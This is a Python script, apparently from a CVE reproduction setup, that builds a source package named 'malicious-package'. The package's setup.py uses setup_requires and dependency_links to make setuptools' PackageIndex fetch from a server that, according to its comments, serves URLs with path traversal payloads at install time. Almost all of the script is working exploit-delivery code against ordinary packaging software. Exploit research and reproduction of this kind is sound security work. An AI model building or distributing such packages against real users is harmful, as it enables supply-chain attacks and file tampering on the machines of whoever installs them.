#!/usr/bin/env python3
"""
Build a malicious Python package that triggers the path traversal
vulnerability when installed via pip.

The package uses setup_requires to trigger setuptools' PackageIndex,
which then fetches from our malicious server with the crafted URL.
"""

import os
import tarfile
import io

PACKAGE_DIR = "/app/packages"


def create_setup_py(index_url):
    """Create a setup.py that triggers PackageIndex via setup_requires."""
    return f'''
from setuptools import setup

# This triggers setuptools.package_index.PackageIndex to fetch the dependency
# from our malicious server, which serves URLs with path traversal payloads
setup(
    name="malicious-package",
    version="1.0",
    py_modules=["malicious"],
    # setup_requires triggers PackageIndex.download() for each dependency
    # The dependency_links tell setuptools where to look
    setup_requires=["triggerpkg"],
    dependency_links=["{index_url}"],
)
'''


def create_malicious_py():
    """Dummy module."""
    return '# Malicious package\nprint("You installed malicious-package!")\n'


def create_pkg_info():
    """PKG-INFO metadata."""
    return '''Metadata-Version: 1.0
Name: malicious-package
Version: 1.0
Summary: A malicious package for CVE demonstration
'''


def build_package(index_url, output_dir):
    """Build a malicious-package-1.0.tar.gz."""
    os.makedirs(output_dir, exist_ok=True)

    tarball_path = os.path.join(output_dir, "malicious-package-1.0.tar.gz")

    with tarfile.open(tarball_path, "w:gz") as tar:
        # Add setup.py
        setup_content = create_setup_py(index_url).encode()
        setup_info = tarfile.TarInfo(name="malicious-package-1.0/setup.py")
        setup_info.size = len(setup_content)
        tar.addfile(setup_info, io.BytesIO(setup_content))

        # Add malicious.py module
        mod_content = create_malicious_py().encode()
        mod_info = tarfile.TarInfo(name="malicious-package-1.0/malicious.py")
        mod_info.size = len(mod_content)
        tar.addfile(mod_info, io.BytesIO(mod_content))

        # Add PKG-INFO
        pkg_content = create_pkg_info().encode()
        pkg_info = tarfile.TarInfo(name="malicious-package-1.0/PKG-INFO")
        pkg_info.size = len(pkg_content)
        tar.addfile(pkg_info, io.BytesIO(pkg_content))

    print(f"[+] Built: {tarball_path}")
    return tarball_path


if __name__ == "__main__":
    import sys
    index_url = sys.argv[1] if len(sys.argv) > 1 else "http://server:8080/simple/"
    build_package(index_url, PACKAGE_DIR)
